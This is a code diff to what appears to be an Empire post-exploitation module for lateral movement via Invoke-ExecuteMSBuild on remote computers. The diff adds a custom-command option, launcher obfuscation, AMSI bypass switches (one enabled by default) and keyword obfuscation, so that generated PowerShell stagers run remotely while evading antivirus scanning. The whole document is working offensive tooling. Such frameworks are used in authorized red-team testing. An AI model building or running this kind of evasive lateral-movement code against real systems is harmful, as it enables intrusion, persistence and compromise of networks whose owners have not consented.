@@ -20,7 +20,7 @@ class Module(object):
 
             'Software': '',
 
-            'Techniques': ['TA0008', 'T1127', 'T1047'],
+            'Techniques': ['T1127', 'T1047'],
 
             # True if the module needs to run in the background
             'Background' : False,
@@ -33,7 +33,7 @@ class Module(object):
 
             # True if the method doesn't touch disk/is reasonably opsec safe
             'OpsecSafe' : False,
-            
+
             # the language for this module
             'Language' : 'powershell',
 
@@ -47,25 +47,46 @@ class Module(object):
             ]
         }
 
-        # any options needed by the module, settable during runtime
         self.options = {
-            # format:
-            #   value_name : {description, required, default_value}
             'Agent' : {
-                # The 'Agent' option is the only one that MUST be in a module
-                'Description'   :   'Agent to grab a screenshot from.',
+                'Description'   :   'Agent to run module from.',
                 'Required'      :   True,
                 'Value'         :   ''
             },
             'Listener' : {
                 'Description'   :   'Listener to use.',
-                'Required'      :   True,
+                'Required'      :   False,
                 'Value'         :   ''
+            },
+            'Command' : {
+                'Description'   :   'Custom command to run.',
+                'Required'      :   False,
+                'Value'         :   ''
+            },
+            'Obfuscate': {
+                'Description': 'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.',
+                'Required': False,
+                'Value': 'False'
+            },
+            'ObfuscateCommand': {
+                'Description': 'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.',
+                'Required': False,
+                'Value': r'Token\All\1'
+            },
+            'AMSIBypass': {
+                'Description': 'Include mattifestation\'s AMSI Bypass in the stager code.',
+                'Required': False,
+                'Value': 'True'
+            },
+            'AMSIBypass2': {
+                'Description': 'Include Tal Liberman\'s AMSI Bypass in the stager code.',
+                'Required': False,
+                'Value': 'False'
             },
             'CredID' : {
                 'Description'   :   'CredID from the store to use.',
                 'Required'      :   False,
-                'Value'         :   ''                
+                'Value'         :   ''
             },
             'UserAgent' : {
                 'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
@@ -109,14 +130,8 @@ class Module(object):
             }
         }
 
-        # save off a copy of the mainMenu object to access external functionality
-        #   like listeners/agent handlers/etc.
         self.mainMenu = mainMenu
 
-        # During instantiation, any settable option parameters
-        #   are passed as an object set to the module and the
-        #   options dictionary is automatically set. This is mostly
-        #   in case options are passed on the command line
         if params:
             for param in params:
                 # parameter format is [Name, Value]
@@ -126,11 +141,24 @@ class Module(object):
 
 
     def generate(self, obfuscate=False, obfuscationCommand=""):
-        
+
+        # Set booleans to false by default
+        Obfuscate = False
+        AMSIBypass = False
+        AMSIBypass2 = False
+
         listenerName = self.options['Listener']['Value']
+        command = self.options['Command']['Value']
         userAgent = self.options['UserAgent']['Value']
         proxy = self.options['Proxy']['Value']
         proxyCreds = self.options['ProxyCreds']['Value']
+        if (self.options['Obfuscate']['Value']).lower() == 'true':
+            Obfuscate = True
+        ObfuscateCommand = self.options['ObfuscateCommand']['Value']
+        if (self.options['AMSIBypass']['Value']).lower() == 'true':
+            AMSIBypass = True
+        if (self.options['AMSIBypass2']['Value']).lower() == 'true':
+            AMSIBypass2 = True
 
         moduleSource = self.mainMenu.installPath + "/data/module_source/lateral_movement/Invoke-ExecuteMSBuild.ps1"
         if obfuscate:
@@ -149,7 +177,7 @@ class Module(object):
         scriptEnd = "Invoke-ExecuteMSBuild"
         credID = self.options["CredID"]['Value']
         if credID != "":
-            
+
             if not self.mainMenu.credentials.is_credential_valid(credID):
                 print(helpers.color("[!] CredID is invalid!"))
                 return ""
@@ -163,20 +191,36 @@ class Module(object):
             if password != "":
                 self.options["Password"]['Value'] = password
 
+        # Only "Command" or "Listener" but not both
+        if (listenerName == "" and command  == ""):
+          print(helpers.color("[!] Listener or Command required"))
+          return ""
+        if (listenerName and command):
+          print(helpers.color("[!] Cannot use Listener and Command at the same time"))
+          return ""
 
-        if not self.mainMenu.listeners.is_listener_valid(listenerName):
+        if not self.mainMenu.listeners.is_listener_valid(listenerName) and not command:
             # not a valid listener, return nothing for the script
             print(helpers.color("[!] Invalid listener: " + listenerName))
             return ""
-        else:
+        elif listenerName:
 
             # generate the PowerShell one-liner with all of the proper options set
-            launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=False, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
+            launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True,
+                                                               obfuscate=Obfuscate, obfuscationCommand=ObfuscateCommand,
+                                                               userAgent=userAgent, proxy=proxy,
+                                                               proxyCreds=proxyCreds, AMSIBypass=AMSIBypass,
+                                                   AMSIBypass2=AMSIBypass2)
             if launcher == "":
                 return ""
             else:
                 launcher = launcher.replace('$','`$')
                 script = script.replace('LAUNCHER',launcher)
+        else:
+            Cmd = command.replace('"','`"').replace('$','`$')
+            script = script.replace('LAUNCHER',Cmd)
+            print(helpers.color("[*] Running command:  " + command))
+
 
         # add any arguments to the end execution of the script
         scriptEnd += " -ComputerName " + self.options['ComputerName']['Value']
@@ -191,7 +235,11 @@ class Module(object):
             scriptEnd += " -FilePath \"" + self.options['FilePath']['Value'] + "\""
 
         scriptEnd += " | Out-String"
+
+        # Get the random function name generated at install and patch the stager with the proper function name
         if obfuscate:
             scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
         script += scriptEnd
+        script = helpers.keyword_obfuscation(script)
+
         return script
